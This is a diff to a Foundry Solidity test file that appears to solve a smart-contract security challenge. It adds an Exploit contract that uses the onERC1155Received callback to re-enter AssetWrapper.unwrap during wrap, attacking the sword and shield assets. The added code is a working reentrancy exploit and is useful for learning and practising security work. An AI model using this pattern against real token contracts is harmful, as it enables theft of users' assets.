@@ -64,6 +64,9 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        Exploit ex = new Exploit(swordAsset, shieldAsset, assetWrapper);
+        ex.attack(address(swordAsset));
+        ex.attack(address(shieldAsset));
 
         vm.stopPrank();
         validation();
@@ -84,4 +87,28 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit {
+
+    GameAsset swordAsset;
+    GameAsset shieldAsset;
+    AssetWrapper wrapper;
+    address targeting;
+
+    constructor(GameAsset _swordAsset, GameAsset _shieldAsset, AssetWrapper _wrapper) {
+        swordAsset = _swordAsset;
+        shieldAsset = _shieldAsset;
+        wrapper = _wrapper;
+    }
+
+    function attack(address targetAsset) external {
+        targeting = targetAsset;
+        wrapper.wrap(0, address(this), targetAsset);
+    }
+
+    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns(bytes4) {
+        wrapper.unwrap(address(this), targeting);
+        return bytes4(0xf23a6e61);
+    }
 }
